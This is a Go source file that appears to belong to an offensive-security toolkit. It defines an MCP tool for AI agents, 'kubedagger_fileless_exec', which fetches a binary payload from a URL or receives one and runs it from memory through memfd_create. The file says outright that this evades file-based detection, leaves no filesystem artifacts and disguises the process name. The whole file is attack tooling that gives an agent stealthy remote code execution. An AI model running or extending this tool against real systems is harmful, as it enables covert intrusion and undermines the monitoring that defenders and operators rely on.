package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type FilelessExecInput struct {
	Binary string `json:"binary"`
	Args   string `json:"args,omitempty"`
	URL    string `json:"url,omitempty"`
	Name   string `json:"name,omitempty"`
}

type FilelessExecTool struct {
	exec executor.Executor
}

func NewFilelessExec(exec executor.Executor) *FilelessExecTool {
	return &FilelessExecTool{exec: exec}
}

func (t *FilelessExecTool) Name() string { return "kubedagger_fileless_exec" }

func (t *FilelessExecTool) Description() string {
	return "Execute binaries directly from memory using memfd_create without touching disk. Downloads or receives binary payload and executes via /proc/self/fd, invisible to file-based detection and leaving no filesystem artifacts."
}

func (t *FilelessExecTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"binary": {
				"type": "string",
				"description": "Path to binary or 'remote' if fetching from URL"
			},
			"args": {
				"type": "string",
				"description": "Arguments to pass to the executed binary"
			},
			"url": {
				"type": "string",
				"description": "URL to fetch binary from (when binary='remote')"
			},
			"name": {
				"type": "string",
				"description": "Process name to display in /proc (camouflage)"
			}
		},
		"required": ["binary"]
	}`)
}

func (t *FilelessExecTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input FilelessExecInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Binary, "binary"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Args, "args"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Name, "name"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"fileless-exec", "--binary", input.Binary}
	if input.Args != "" {
		args = append(args, "--args", input.Args)
	}
	if input.URL != "" {
		args = append(args, "--url", input.URL)
	}
	if input.Name != "" {
		args = append(args, "--name", input.Name)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger fileless-exec failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Fileless Exec\n\n")
	if output == "" {
		sb.WriteString("Execution completed (no output).\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
